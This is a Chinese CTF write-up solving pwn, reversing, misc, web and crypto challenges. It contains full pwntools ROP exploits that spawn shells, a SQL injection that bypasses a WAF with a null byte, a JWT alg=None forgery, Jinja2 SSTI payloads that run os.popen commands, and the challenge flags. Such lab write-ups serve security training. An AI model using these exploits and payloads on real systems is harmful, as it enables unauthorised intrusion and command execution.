# PWN

## easypwn

漏洞点在：
```c
int __fastcall sub_4006C6(const char *a1)
{
  char dest; // [rsp+10h] [rbp-10h]

  strcpy(&dest, a1);
  return printf("%s", &dest);
}
```
很明显的一个栈溢出，唯一的问题是`strcpy`函数会`\x00` 截断，但是这个函数开辟的栈空间很小很小，我们可以用一个`gadget` 来绕过这个截断
gadget为：
```c
0x00000000004007db : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
```
绕过了这个限制后面就是栈溢出的常规利用了

最终的exp为

```python
from pwn import *

def debug(addr,PIE=True):
	if PIE:
		text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
		gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
	else:
		gdb.attach(p,"b *{}".format(hex(addr)))

def main(host,port=10001):
	global p
	if host:
		p = remote(host,port)
	else:
		p = process("./easypwn")
		debug(0x000000000400767,0)
	# 0x00000000004007db : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
	# 0x00000000004007e3 : pop rdi ; ret
	# 0x00000000004007e1 : pop rsi ; pop r15 ; ret
	# 00000000004007DA                 pop     rbx
	# .text:00000000004007DB                 pop     rbp
	# .text:00000000004007DC                 pop     r12
	# .text:00000000004007DE                 pop     r13
	# .text:00000000004007E0                 pop     r14
	# .text:00000000004007E2                 pop     r15
	# .text:00000000004007E4                 retn
	# 0xf02a4	execve("/bin/sh", rsp+0x50, environ)
	# constraints:
	# [rsp+0x50] == NULL

	p_r = 0x00000000004007e3
	p_rsi = 0x00000000004007e1
	ppppp_r = 0x00000000004007db
	gadget = 0x0000000004007DA
	p.recvuntil("Welcome to CTF")
	payload = "A"*0x18+p64(ppppp_r)+"A"*8+p64(p_r)+p64(0)
	payload += p64(gadget)+p64(0)+p64(1)+p64(elf.got["write"])+p64(0x10)+p64(elf.got["write"])+p64(1)
	payload += p64(0x0000000004007C0)
	payload += "A"*8+p64(0)*6+p64(0x0000000004006FD)
	p.send(payload)
	p.recvuntil("\xdb\x07\x40")
	libc.address = u64(p.recv(6).ljust(8,'\x00'))-libc.symbols["write"]
	info("libc : " + hex(libc.address))
	p.recvuntil("Welcome to CTF")
	payload = "A"*0x18+p64(ppppp_r)+"A"*8+p64(libc.address+0xf02a4)+"\x00"*0x70
	p.send(payload)
	p.interactive()
if __name__ == "__main__":
	libc = ELF("libc-2.23.so",checksec=False)
	elf = ELF("./easypwn",checksec=False)
	main(args['REMOTE'])
```

## choice

漏洞点在
```c
  nbytes = 21;
  v3 = 0;
  puts("Welcome to life choice!");
  puts("Please enter your name:");
  fflush(stdout);
  read(0, name, nbytes);
  if ( strlen(name) > 0x14 )
    printf("Your name's too long!");
/*
.bss:0804A04C name            db 14h dup(?)           ; DATA XREF: main+82↑o
.bss:0804A04C                                         ; main+94↑o ...
.bss:0804A060 ; size_t nbytes
.bss:0804A060 nbytes          dd ?                    ; DATA XREF: sub_804857B+16↑r
.bss:0804A060
*/
```

可以看到我们输入的`name`刚好可以覆盖到`nbytes`，然后结合后面的

```c
if ( v3 > 2 && v3 <= 3 )
  {
    puts("Cool! And whd did you choice it?");
    fflush(stdout);
    read(0, &v1, nbytes);    //<------------
    puts("Your choice is correct");
  }
  else
  {
    puts("Wrong choice!");
    sub_804857B();
  }
```
就可以栈溢出了，这题也没有canary
在`sub_804857B()`里溢出会更简单一点

exp 为
```python
from pwn import *

def debug(addr,PIE=True):
	if PIE:
		text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
		gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
	else:
		gdb.attach(p,"b *{}".format(hex(addr)))

def main(host,port=10002):
	global p
	if host:
		p = remote(host,port)
	else:
		p = process("./choice",env={"LD_PRELOAD":"./libc.so"})
		debug(0x080485B9,0)
	p.recvuntil("Please enter your name:")
	p.send("A"+"\x00"*0x13+"\xf8")
	p.recvuntil("3. Study hard from now")
	p.sendline("1")
	p.recvuntil("Wrong choice!\n")
	p.recvuntil("choice it?\n")
	p.send("A"*0x1c+p32(0xcafebabe)+p32(elf.symbols["puts"])+p32(0x8048718)+p32(elf.got["puts"]))
	p.recvuntil("Good bye!\n")
	libc.address = u32(p.recv(4))-libc.symbols["puts"]
	info("libc : " + hex(libc.address))
	p.recvuntil("choice it?\n")
	p.send("A"*0x20+p32(libc.symbols["system"])+p32(0)+p32(libc.search("/bin/sh\x00").next()))
	p.interactive()
if __name__ == "__main__":
	libc = ELF("./libc.so",checksec=False)
	elf = ELF("./choice",checksec=False)
	main(args['REMOTE'])
```

# Re

## guess the key

程序提供了加密方式，和一对明文密文对，直接先求出key，在逆加密算法即可

求key的脚本

```python
f = open("msg01.enc","rb")
enc1 = f.read()
f.close()
k = ''
t = 0
i = 0
msg = 'Hi,there is nothing here,heiheihei.\n'
for char in enc1:
	k += chr(((ord(char)-i*i-ord(msg[i]))^t)&0xff)
	t = ord(msg[i])
	i += 1
print k

# VeryVeryLongKeyYouWillNeverKnowVeryV
```
加密函数有对`key`的长度进行取模，所以`key`应该为`VeryVeryLongKeyYouWillNeverKnow`

然后逆算法即可

```
#include <stdio.h>

int main(){
	char plain[0x200];
	char k[] = "VeryVeryLongKeyYouWillNeverKnow";
	char c, p, t = 0;
	int i = 0;
	FILE* input  = fopen("msg02.enc", "rb");
	while((c = fgetc(input)) != EOF){
		plain[i] = c - i*i - (k[i % strlen(k)] ^ t);
		t = plain[i];
		i++;
	}
	write(1,plain,0x1a0);
	return 0;
}
// She had been shopping with her Mom in Wal-Mart. She must have been 6 years old, this beautiful brown haired, freckle-faced image of innocence. It was pouring outside. The kind of rain that gushes over the top of rain gutters, so much in a hurry to hit the Earth, it has no time to flow down the spout.flag{101a6ec9f938885df0a44f20458d2eb4}
```

## i have the_flag

页面js一堆没用的函数，只有一个`ck`函数有用

```javascript

function ck(s) {
    try {
        ic
    } catch (e) {
        return;
    }
    var a = [118, 108, 112, 115, 111, 104, 104, 103, 120, 52, 53, 54];
    if (s.length == a.length) {
        for (i = 0; i < s.length; i++) {
            if (a[i] - s.charCodeAt(i) != 3)
                return ic = false;
        }
        return ic = true;
    }
    return ic = false;
}
```
python解一下

```python
a = [118, 108, 112, 115, 111, 104, 104, 103, 120, 52, 53, 54]
s = ''
for i in a:
	s += chr(i-3)
print s
# simpleedu123
```

然后输入进去

```html
I have the Flag
Type in something to get the flag.

Tips: Maybe you have the flag.

Something: 
simpleedu123


Congratulations!!

muWn9NU0H6erBN/w+C7HVg
```
`flag`为`muWn9NU0H6erBN/w+C7HVg`

## twins

两个程序，分别向TWINS.BIN写入数据

函数被我重命名过了

```c
 else
    {
      stream = fopen("TWINS.BIN", "w");
      if ( stream )
      {
        v8 = getenc_by_idx(idx);
        v9 = v8;
        v13 = fputc(v8, stream);
        if ( v9 == v13 )
        {
          ++idx;
          v5 = v9;
          v1 = std::operator<<<std::char_traits<char>>(&std::cout, "Hey, are u there, my brother-twin?");
          std::ostream::operator<<(v1, &std::endl<char,std::char_traits<char>>);
        }
        fclose(stream);
      }
    }
```

于是只要看下那个`get_enc_by_idx`的逻辑就好了，写个脚本模拟两个程序写入即可

```c
__int64 __fastcall getenc_by_idx(int a1)
{
  signed int i; // [rsp+10h] [rbp-4h]

  for ( i = 0; i <= 78; ++i )
  {
    if ( (unsigned __int8)byte_602120[i] == a1 )
      return (unsigned __int8)byte_6020C0[i];
  }
  return 0LL;
}
```

用ida扣出那个`byte_602120`和`byte_6020C0`

脚本如下:

```python
def get_enc(idxs,enc,idx):
	for i in range(80):
		if idxs[i] == idx:
			return enc[i]
twins1_idx = [
  0x4C, 0x46, 0x0E, 0x4A, 0x1A, 0x2E, 0x16, 0x06, 0x23, 0x08, 
  0x27, 0x4E, 0x0C, 0x24, 0x2F, 0x3D, 0x3E, 0x49, 0x34, 0x0D, 
  0x2B, 0x1D, 0x39, 0x48, 0x43, 0x04, 0x1E, 0x2D, 0x2C, 0x33, 
  0x25, 0x15, 0x22, 0x2A, 0x40, 0x41, 0x00, 0x4D, 0x1F, 0x35, 
  0x03, 0x18, 0x38, 0x45, 0x10, 0x05, 0x4B, 0x47, 0x36, 0x0B, 
  0x19, 0x02, 0x3A, 0x1C, 0x44, 0x14, 0x01, 0x30, 0x37, 0x07, 
  0x3F, 0x1B, 0x26, 0x17, 0x11, 0x3C, 0x21, 0x12, 0x29, 0x09, 
  0x32, 0x13, 0x42, 0x0A, 0x20, 0x28, 0x3B, 0x0F, 0x31, 0x00
]
twins2_idx = [
  0x3F, 0x15, 0x34, 0x0B, 0x4D, 0x07, 0x28, 0x14, 0x1E, 0x18, 
  0x17, 0x2C, 0x2D, 0x0E, 0x05, 0x19, 0x39, 0x11, 0x1C, 0x45, 
  0x16, 0x1B, 0x27, 0x31, 0x1D, 0x21, 0x10, 0x08, 0x24, 0x2B, 
  0x29, 0x4E, 0x0F, 0x0C, 0x3B, 0x43, 0x13, 0x33, 0x35, 0x2F, 
  0x0A, 0x06, 0x03, 0x00, 0x23, 0x25, 0x04, 0x44, 0x46, 0x1A, 
  0x30, 0x3C, 0x4C, 0x2A, 0x1F, 0x4A, 0x3A, 0x12, 0x40, 0x26, 
  0x01, 0x42, 0x48, 0x3D, 0x41, 0x09, 0x36, 0x38, 0x20, 0x4B, 
  0x0D, 0x37, 0x22, 0x3E, 0x2E, 0x32, 0x02, 0x49, 0x47, 0x00
]
twins1_enc = "2871616F6F455925744C7331746C3547654F2E2A5F722D76476D4026337A7440727B4C643D312E40556266773733365F6F74717A334254396E5E306D48736F3176396E6E61496F6B57616366434C4900".decode('hex')
twins2_enc = "522A283030686C332D79652538294570343938215F372D532867336C614A673068316779362D526D266E352D75693231256A586B30322D6C7445596E4C7224537470622B6F4625626174547D6A247400".decode('hex')


msg = ""
for i in range(79):
	msg += get_enc(twins1_idx,twins1_enc,i)
	msg += get_enc(twins2_idx,twins2_enc,i)
print msg
#=-nLzjU5m23E%nmhLlIpa&t0t1*%a)Lh73v9nEk693@*Y_1ebyqpojs7B8r(@-.-congratulations-flag{2_J3%&8ET5m^XISo}z-.(@Rob0bf+-43tCg9kGSetHRLYdtWrGyT1w!q%_tv$O$ol6F(01010
```
`flag`为`flag{2_J3%&8ET5m^XISo}`

## 逐位判断

直接跟进`DialogFunc`函数

```c
 DialogBoxParamA(hInstance, (LPCSTR)0x81, 0, DialogFunc, 0);
```

然后可以看到

```
 else if ( (_WORD)a3 == 1002 )
    {
      GetDlgItemTextA(hDlg, 1001, &String, 1024);
      sub_401070(&String);
    }
```
判断`flag`的应该在`sub_401070`函数里

在里面可以看见这个

```
 if ( v2 + v1 == 3 )
    result = sub_401000();
  else
    result = MessageBoxA(0, "flag:{VEg46R4m03a0170d16b045045f7c3a040a43c103a}", "Flag", 0);
```

`sub_401000`函数就是输出最终的`flag`函数

```c
 strncpy_s(&Dst, 0x31u, "flag:{VEg46R4m03a0170d16b045045f7c3a040a43c103a}", 0x30u);
  v0 = &v4;
  if ( v4 != '}' )
  {
    do
    {
      *v0 ^= 7u;
      ++v0;
    }
    while ( *v0 != '}' );
  }
  return MessageBoxA(0, &Dst, "Flag", 0);
```
注意下不是从头开始异或就好

脚本如下:

```python

# enc = '4A50466A586A323B394757574D'.decode("hex")[::-1]
# msg = ''
# for i in enc:
	# msg += chr(ord(i)^7)
# print msg

enc = "flag:{VEg46R4m03a0170d16b045045f7c3a040a43c103a}"[15:]
msg = "flag:{VEg46R4m03a0170d16b045045f7c3a040a43c103a}"[:15]
print msg
for i in enc[:-1]:
	msg += chr(ord(i)^7)
print msg+'}'
 
# flag:{VEg46R4m04f7607c61e732732a0d4f737f34d674f}
# flag{VEg46R4m04f7607c61e732732a0d4f737f34d674f}
```
`flag`要去掉冒号,当时没看见一直提交错误。。。。
其实还可以直接调试，把`eip`修改为`0x401000`，跑起来就有`flag`了

# Misc

## 猜谜语
```
方方格格绕花眼，手在电脑不离它!~~
27 18 21 19 16 17
```
估摸着是电脑键盘密码

电脑键盘坐标加密，利用键盘上面的字母行和数字行来加密，例：bye 用电脑键盘 XY 表示就是：351613

![电脑键盘坐标加密](computer-x-y.jpg)

按照这图输入`jiaoyu`
服务器回显了

```
flag{d96e7b63-cc8b-4369-9d4f-90ed3be265ab}
```

## puppy

foremost提取00.jpg得到flag.txt

## 适合做桌面的图片

原图丢进`stegsolve.jar`，按左右键翻一下就可以找到一个二维码，但边缘模糊，无法直接使用。

于是使用`Photoshop`，调整图像阀值为`1`左上角的二维码清晰可见，使用裁剪工具裁剪下来，`CTRL+S`。

扫描后得到一大串16进制编码，通过`010Editor`将16进制值导入，导出文件，发现有字符串`1.pyt`，推测是个pyc文件(不信的话可以在linux下使用`file`命令看看)，然后直接用工具反编译得到源码，运行得到flag。

```python
def flag():
    str = [102,108,97,103,123,51,56,97,53,55,48,51,50,48,56,53,52,52,49,101,55,125]
    flag = ''
    for i in str:
        flag += chr(i)
    print flag
flag()
```

## 找找找 找不到解开你心的钥匙

`networkmisc.pcap`，流量分析题。

查看传输的文件：`Wireshark菜单`->`文件`->`导出对象`->`HTTP...`，找到一个secret.txt，点一下它再按`save`按钮导出

```
the password for zip file is : ZipYourMouth
```

直接foremost提取文件

Flag-qscet5234diQ

# web

## a little hard

```php
<?php
function GetIP(){
if(!empty($_SERVER["HTTP_CLIENT_IP"]))
	$cip = $_SERVER["HTTP_CLIENT_IP"];
else if(!empty($_SERVER["HTTP_X_FORWARDED_FOR"]))
	$cip = $_SERVER["HTTP_X_FORWARDED_FOR"];
else if(!empty($_SERVER["REMOTE_ADDR"]))
	$cip = $_SERVER["REMOTE_ADDR"];
else
	$cip = "0.0.0.0";
return $cip;
}

$GetIPs = GetIP();
if ($GetIPs=="1.1.1.1"){
echo "Great! Key is *********";
}
else{
echo "�������IP���ڷ����б�֮�ڣ�";
}
?>
```

题目直接给了源码，阅读源码可知可通过伪造XFF头令变量`$GetsIP`值为`1.1.1.1`，构造请求头即可得到flag

```
GET /hard/ HTTP/1.1
Host: 202.0.0.37
x-forwarded-for: 1.1.1.1
Connection: close
```

## click_1

题目给了一串Js代码`eval(unescape_blue14(...))`，将`eval()`改为`console.log()`可在控制台中输出被编码的js代码。

```javascript
document.write(unescape_blue14("%44%72%77%86%24%77%72%45%26%73%83%71%26%24%83%84%89%7a%73%45%26%80%7d%83%77%84%77%7d%7c%42%6d%70%83%7d%7a%85%84%73%43%26%46%44%77%7c%80%85%84%24%84%89%80%73%45%26%70%85%84%84%7d%7c%26%24%7d%7c%74%7d%71%85%83%45%26%7c%7d%79%80%2c%2d%43%26%24%7d%7c%71%7a%77%71%79%45%26%87%77%7c%72%7d%87%34%7a%7d%71%6d%84%77%7d%7c%45%2b%47%79%73%89%45%3D%36%36%71%2b%43%26%24%86%6d%7a%85%73%45%26%71%7a%77%71%79%24%7b%73%25%26%46%44%35%72%77%86%46%44%77%7c%80%85%84%24%84%89%80%73%45%26%84%73%88%84%26%24%82%73%6d%72%7d%7c%7a%89%24%83%84%89%7a%73%45%26%87%77%72%84%76%42%39%3b%36%43%26%24%77%72%45%26%76%77%7c%84%26%24%86%6d%7a%85%73%45%26%72%7d%24%89%7d%85%24%87%6d%7c%84%24%84%7d%24%78%7d%77%7c%47%24%71%6d%84%71%76%24%70%85%84%84%7d%7c%32%24%77%74%24%89%7d%85%24%71%6d%7c%25%26%46"));obj=document.getElementById("esc");document.onmousemove=escdiv;document.onkeypress=nokp;obj.style.left=-200;obj.style.top=-200;var i=0,ax=0,ay=200,sw=1,r=200;document.getElementById('esc').style.top=-500;document.oncontextmenu=nokp;document.onselectstart=nokp;document.ondragstart=nokp;
```

发现还有一层编码，老办法，将`document.write()`改为`console.log()`，得到一串HTML，其中我们可以注意到`?key=700c`，于是构造URL访问http://202.0.0.37/click/?key=700c即可得到flag

```html
<div id="esc" style="position:absolute;"><input type="button" onfocus="nokp();" onclick="window.location='?key=700c';" value="click me!"></div><input type="text" readonly style="width:350;" id="hint" value="do you want to join? catch button, if you can!">
```

## 花式过waf

2018黑盾杯原题，使用工具扫描后发现有`www.zip`，下载源码。经过比较，与去年`2018黑盾杯-waf`无任何区别。

`function.php`: eregi 使用 %00过掉

```php
function filtering($str) {
    $check= eregi('select|insert|update|delete|\'|\/\*|\*|\.\.\/|\.\/|union|into|load_file|outfile', $str);
    if($check)
        {
        echo "非法字符!";
        exit();
    }
    .....
}
```

`content.php`: 里面直接拼接给的参数

```php
<?php
include './global.php';
extract($_REQUEST);

$sql = "select * from test.content where id=$message_id";

```

构造请求得到flag。

```
POST /waf/content.php HTTP/1.1
Host: 202.0.0.37
Connection: close
Content-Type: multipart/form-data; boundary=--------1490982421
Content-Length: 139

----------1490982421
Content-Disposition: form-data; name="message_id"

"%00" union select 1,2,flag,4 from flag
----------1490982421--
```

## 忘记密码了

题目一开始只有一个文本框，要求填入email，随便填一个后有alert提示前往`/forget/step2.php?email=youremail@address.com&check=?????`进行下一步

发现网页源代码中有重要信息：

```html
	<meta name="admin" content="admin@simplexue.com" />
	<meta name="editor" content="Vim" />
```

并且`step2.php`中含有一个提交到`submit.php`的表单，有`emailAddress`字段和`token`字段

看到Vim可以想到Vim编辑器在非正常退出的情况下会留下`.swp`文件，经过逐个测试发现了`submit.php`的源码

http://202.0.0.37/forget/.submit.php.swp

```php
........这一行是省略的代码........

/*
如果登录邮箱地址不是管理员则 die()
数据库结构

--
-- 表的结构 `user`
--

CREATE TABLE IF NOT EXISTS `user` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `username` varchar(255) NOT NULL,
  `email` varchar(255) NOT NULL,
  `token` int(255) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=2 ;

--
-- 转存表中的数据 `user`
--

INSERT INTO `user` (`id`, `username`, `email`, `token`) VALUES
(1, '****不可见***', '***不可见***', 0);
*/


........这一行是省略的代码........

if(!empty($token)&&!empty($emailAddress)){
	if(strlen($token)!=10) die('fail');
	if($token!='0') die('fail');
	$sql = "SELECT count(*) as num from `user` where token='$token' AND email='$emailAddress'";
	$r = mysql_query($sql) or die('db error');
	$r = mysql_fetch_assoc($r);
	$r = $r['num'];
	if($r>0){
		echo $flag;
	}else{
		echo "失败了呀";
	}
}
```

按照代码构造`token`，得到flag

```
GET /forget/submit.php?emailAddress=admin@simplexue.com&token=0000000000
```

## py一波吧-ssti+jwt_1

`JWT alg=None 签名bypass攻击` -> `SSTI`，强行把两道题拼成一道题，没有第一步不能进入SSTI。

工具地址：https://github.com/ticarpi/jwt_tool，建议手动操作。

随便输入一个用户名密码，将cookie里面的token提取出来，解base64可得

```
{"alg":"HS256","typ":"JWT"}.{"username":"admin1"}.signature
```

因为服务端没有强制指定签名算法，修改`alg`为`None`，并将`username`数据设置为`admin`，`base64.urlsafe_b64encode()`编码回去得到

```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.
```

把token换上去，就可以进入SSTI流程了。

SSTI过滤了：单引号、os、system、[]

Jinja2对与不存在的对象有一个特殊的定义**Undefined**类，`<class 'jinja2.runtime.Undefined'>`

**jinja2/runtime.py**

```python
@implements_to_string
class Undefined(object):
    ...
```

通过构造`title={{vvv.__class__.__init__.__globals__ }}`就可以搞事情了，发现有个`eval`，就是它了。

```python
{'new_context': <function new_context at 0x7fc79bb4faa0>, 'chain': <type 'itertools.chain'>, '_context_function_types': (<type 'function'>, <type 'instancemethod'>), 'resolve_or_missing': <function resolve_or_missing at 0x7fc79bb4fcf8>, 'Namespace': <class 'jinja2.utils.Namespace'>, 'ContextMeta': <class 'jinja2.runtime.ContextMeta'>, 'evalcontextfunction': <function evalcontextfunction at 0x7fc79bd919b0>, 'escape': <built-in function escape>, 'LoopContext': <class 'jinja2.runtime.LoopContext'>, '_first_iteration': <object object at 0x7fc79f5b2190>, 'TemplateNotFound': <class 'jinja2.exceptions.TemplateNotFound'>,···'eval': <built-in function eval>
```

不能用`[]`可以使用`.get()`绕过，被过滤的字符串可以拆分成2个字符串或者使用格式化字符串的方法。

```python
{{vvv.__class__.__init__.__globals__.get("__bui"+"ltins__").get("e"+"val")("__imp"+"ort__(\"o"+"s\").po"+"pen(\"ls\").read()")}}
```

执行命令列目录，发现没有传说中的flag，但是发现了一个以数字+英文组合为文件名的文件，经过确认，就是flag

```python
{{vvv.__class__.__init__.__globals__.get("__bui"+"ltins__").get("e"+"val")("__imp"+"ort__(\"o"+"s\").po"+"pen(\"cat f41321d3b61338c8d239e75d971f34a4\").read()")}}
```

本题源码在`/app/none`路径下，也可通过构造类似命令进行读取。



# crypto

## MaybeBase

YMFZZTY0D3RMD3RMMTIZ 这一串到底是什么！！！！为什么这么像base32却不是！！！明文的md5值为16478a151bdd41335dcd69b270f6b985

小爆破列出所有字符串组合的md5

得到YmFzZTY0d3Rmd3RmMTIz的md5值为16478a151bdd41335dcd69b270f6b985
flag为base64wtfwtf123

```python
import base64,hashlib
def change(ch):
	if ord(ch)<92:
		return chr(ord(ch)+32)
	else:
		return chr(ord(ch)-32)
'''
if __name__ == '__main__':
	flag='?????'
	rawstr=base64.b64encode(flag)
	finalstr=''
	for i in range(0,len(rawstr)):
		if ord(rawstr[i])>96 and ord(rawstr[i])<123:
			finalstr+=change(rawstr[i])
		else:
			finalstr+=rawstr[i]
	print rawstr
	print finalstr
'''
//以上是题目
def enum(x,depth):
	if depth==17:
		cipher=''.join(x)
		if check(cipher):
			exit()
		return
	x1=x[::1]
	x2=x[::1]
	x2[t[depth]]=change(x2[t[depth]])
	enum(x1,depth+1)
	enum(x2,depth+1)

def check(cipher):
	
	m=hashlib.md5()
	b=base64.b64decode(cipher)
	m.update(b)
	res=m.hexdigest()
	print(cipher,res)
	if ans==res:
		print(b)
		return True

c=['Y', 'M', 'F', 'Z', 'Z', 'T', 'Y', '0', 'D', '3', 'R', 'M', 'D', '3', 'R', 'M', 'M', 'T', 'I', 'Z']
t=[0,1,2,3,4,5,6,8,10,11,12,13,15,16,17,18,19]
ans='16478a151bdd41335dcd69b270f6b985'
enum(c,0)

```

